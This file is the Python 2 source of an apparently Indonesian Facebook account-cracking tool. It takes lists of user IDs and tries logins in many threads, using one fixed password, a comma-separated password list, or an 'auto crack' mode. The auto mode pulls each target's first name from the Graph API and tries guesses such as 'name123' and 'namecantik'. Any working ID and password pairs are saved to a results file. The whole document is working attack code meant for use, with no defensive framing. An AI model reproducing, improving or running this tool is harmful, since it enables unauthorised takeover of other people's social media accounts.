import os
import sys
import json
import requests
import interpreter
from data import token
from data.color import *
from data import new_token
from multiprocessing.pool import ThreadPool

def panggil(iterable):
	if len(iterable) !=0:
		print "\n%s[*]%s Found: %s"%(G,N,len(iterable))
		for i in iterable:
			print "%s[*]%s %s"%(G,N,i)
		print "\n[+] output: out/multiresult.txt"
		raw_input("press enter to menu...")
		interpreter.ASU()
	else:
		print "\n%s[!]%s no result found:))"%(R,N)
		raw_input("press enter to menu...")
		interpreter.ASU()

def ngontol():
	if os.path.exists("out"):
		if os.path.exists("out/checkpoint.txt"):
			if os.path.getsize("out/checkpoint.txt") !=0:
				cek=raw_input('%s[!]%s file exists: out/%scheckpoint.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,N,R,N)).lower()
				if cek == "y":
					open("out/checkpoint.txt","w").close()
			else:open("out/checkpoint.txt","w").close()
	else:
		os.mkdir("out")
		open("out/checkpoint.txt","w").close()
	if os.path.exists("out"):
		if os.path.exists("out/multiresult.txt"):
			if os.path.getsize("out/multiresult.txt") !=0:
				cek=raw_input('%s[!]%s file exists: out/%smultiresult.txt%s\n%s[?]%s replace? y/n): '%(R,N,B,N,R,N)).lower()
				if cek == "y":
					open("out/multiresult.txt","w").close()
		else:
			filez=open("out/multiresult.txt","w").close()
	else:
		os.mkdir("out")
		filez=open("out/multiresult.txt","w").close()
		
class v1(object):
	def __init__(self):
		ngontol()
		self.suc=0
		self.found=[]
		self.cp=[]
		self.fl()
			
	def fl(self):
		try:
			self.a=open(raw_input("%s[?]%s List ID: "%(G,N))).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.fl()
		self.ps()
		
	def ps(self):
		self.pw=raw_input("%s[?]%s Password To Crack: "%(G,N))
		if self.pw =="":
			self.ps()
		else:self.t()
		
	def t(self):
		try:
			self.tg=ThreadPool(input("%s[?]%s Thread: "%(G,N)))
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.t()
		print "%s[*]%s output: out/multiresult.txt"%(G,N)
		self.tg.map(self.crack,self.a)
		panggil(self.found)
		
	def crack(self,id):
		self.suc+=1
		try:
			login=token.token("%s|%s"%(id,self.pw))
			if login !=False:
				if id in open("out/multiresult.txt").read():
					pass
				else:
					self.found.append("%s|%s"%(id,self.pw))
					open("out/multiresult.txt","a").write("%s|%s\n"%(id,self.pw))
		except:
			pass
		print "\r%s[+]%s Cracking: %s/%s - Found:-%s%s%s"%(
			G,N,self.suc,len(self.a),G,len(self.found),N),;sys.stdout.flush()

class v2(object):
	def __init__(self):
		ngontol()
		self.suc=0
		self.found=[]
		self.cp=[]
		self.fl()

			
	def fl(self):
		try:
			self.a=open(raw_input("%s[?]%s List ID: "%(G,N))).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.fl()
		print "%s*%s Example: password123,password1234"%(G,N)
		self.ps()
		
	def ps(self):
		self.pw=raw_input("%s[?]%s Password To Crack: "%(G,N)).split(",")
		if self.pw =="":
			self.ps()
		else:self.t()
		
	def t(self):
		try:
			self.tg=ThreadPool(input("%s[?]%s Thread: "%(G,N)))
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.t()
		print "%s[*]%s output: out/multiresult.txt"%(G,N)
		self.tg.map(self.crack,self.a)
		panggil(self.found)
		
	def crack(self,id):
		self.suc+=1
		for i in self.pw:
			try:
				login=token.token("%s|%s"%(id,i))
				if login !=False:
					if id in open("out/multiresult.txt").read():
						continue
					else:
						self.found.append("%s|%s"%(id,i))
						open("out/multiresult.txt","a").write("%s|%s\n"%(id,i))
						break
			except:
				pass
		print "\r%s[+]%s Cracking: %s/%s - Found:-%s%s%s"%(
			G,N,self.suc,len(self.a),G,len(self.found),N),;sys.stdout.flush()
			
			
class v3(object):
	def __init__(self):
		ngontol()
		self.suc=0
		self.found=[]
		self.cp=[]
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.token=token.token("%s|%s"%(self.config["email"],self.config["pass"]))
		if self.token !=False:
			self.fl()
		else:
			exit("%s[!]%s logi  failed."%(R,N))

			
	def fl(self):
		try:
			self.a=open(raw_input("%s[?]%s List ID: "%(G,N))).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.fl()
		self.t()
		
	def t(self):
		try:
			self.tg=ThreadPool(input("%s[?]%s Thread: "%(G,N)))
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.t()
		print "%s[*]%s output: out/multiresult.txt"%(G,N)
		self.tg.map(self.crack,self.a)
		panggil(self.found)
		
	def crack(self,id):
		self.suc+=1
		try:
			sz=requests.get("https://graph.facebook.com/%s?access_token=%s"%(id,self.token)).json()
			for i in ["%s123"%(sz["first_name"]),"%s12345"%(sz["first_name"]),
				"%scantik"%(sz["first_name"]),"%sganteng"%(sz["first_name"])]:
				try:
					login=token.token("%s|%s"%(id,i))
					if login !=False:
						if id in open("out/multiresult.txt").read():
							continue
						else:
							self.found.append("%s|%s"%(id,i))
							open("out/multiresult.txt","a").write("%s|%s\n"%(id,i))
							break
				except:pass
		except:pass
		print "\r%s[+]%s Cracking: %s/%s - Found:-%s%s%s"%(
			G,N,self.suc,len(self.a),G,len(self.found),N),;sys.stdout.flush()
			
def choice():
	s=raw_input("%s[Choice> %s"%(G,N))
	if s =="":
		choice()
	elif s =="1" or s =="01":
		v1()
	elif s =="2" or s =="02":
		v2()
	elif s =="3" or s =="03":
		v3()
	elif s =="4" or s =="04":
		interpreter.ASU()
	else:
		print "%s[!]%s invalid options!"%(R,N)
		choice()
		
def menu():
	print "\n\t[ Select Options ]\n"
	print "{%s01%s} Crack With 1 Passwords"%(G,N)
	print "{%s02%s} Crack With More Than Passwords"%(G,N)
	print "{%s03%s} Auto Crack"%(G,N)
	print "{%s04%s} Back To Menu Options\n"%(R,N)
	choice()

			
